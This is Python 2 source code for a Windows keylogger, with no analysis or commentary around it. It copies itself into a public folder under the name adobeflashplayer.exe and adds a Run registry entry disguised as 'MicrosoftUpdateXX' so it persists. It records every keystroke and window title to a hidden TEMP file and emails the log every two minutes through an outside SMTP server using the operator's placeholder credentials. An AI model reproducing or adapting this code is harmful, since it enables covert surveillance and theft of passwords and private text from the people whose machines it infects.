import pythoncom
import pyHook
from os import path
import urllib
import urllib2
import win32com.client
import win32event
import win32api
import winerror
from _winreg import *
import shutil
import sys
import datetime
import os
import random
import smtplib
import string
import time
import threading
from email.mime.text import MIMEText

lastWindow = ''

def id_generator(size=6, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


global logfile

def id_generator(size=6, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

temp_path = os.getenv('TEMP')
logfile = temp_path + "\\" + id_generator(15)

f = open(logfile, 'a')
f.write('')
f.close()

ironm = win32event.CreateMutex(None, 1, 'NOSIGN')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    ironm = None
    print 'nope'
    sys.exit()

dir = r"C:\Users\Public\Libraries\adobeflashplayer.exe"


def startup():
    shutil.copy(sys.argv[0], dir)
    aReg = ConnectRegistry(None, HKEY_CURRENT_USER)
    aKey = OpenKey(aReg,
                   r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0,
                   KEY_WRITE)
    SetValueEx(aKey, 'MicrosoftUpdateXX', 0, REG_SZ, dir)


if not path.isfile(dir):
    startup()


def keylogger():

    def OnKeyboardEvent(event):
        global lastWindow
        window = event.WindowName
        keys = {
            13: ' [ENTER] ',
            8: ' [BACKSPACE] ',
            162: ' [CTRL] ',
            163: ' [CTRL] ',
            164: ' [ALT] ',
            165: ' [ALT] ',
            160: ' [SHIFT] ',
            161: ' [SHIFT] ',
            46: ' [DELETE] ',
            32: ' [SPACE] ',
            27: ' [ESC] ',
            9: ' [TAB] ',
            20: ' [CAPSLOCK] ',
            38: ' [UP] ',
            40: ' [DOWN] ',
            37: ' [LEFT] ',
            39: ' [RIGHT] ',
            91: ' [SUPER] ',
            }
        keyboardKeyName = keys.get(event.Ascii, chr(event.Ascii))
        data = ''
        if window != lastWindow:
            lastWindow = window
            data += '\n\n{ ' + lastWindow + ' } \n'
            data += keyboardKeyName
        else:
            data += keyboardKeyName
        f = open(logfile, 'a')
        f.write(data)
        f.close()

    hm = pyHook.HookManager()
    hm.KeyDown = OnKeyboardEvent
    hm.HookKeyboard()
    pythoncom.PumpMessages()


def mailsender():
    mail = EEMAIL
    password = EPASS

    while 1:
        time.sleep(120)
        fo = open(logfile, 'r')
        msg = MIMEText(fo.read())
        fo.close()

        if len(msg.as_string()) > 30:
            timeInSecs = datetime.datetime.now()
            msg['Subject'] = 'B33: ' + timeInSecs.isoformat()
            msg['From'] = mail
            msg['To'] = mail

            try:
                s = smtplib.SMTP('smtp.gmx.com:25')

                # s = smtplib.SMTP_SSL('smtp.india.com:465')
                s.login(mail, password)
                s.sendmail(mail, [mail], msg.as_string())
                s.close()
            except Exception, a:
                print a


if __name__ == '__main__':
    thread1 = threading.Thread(name='log', target=keylogger)
    thread2 = threading.Thread(name='mail', target=mailsender)

    thread1.start()
    thread2.start()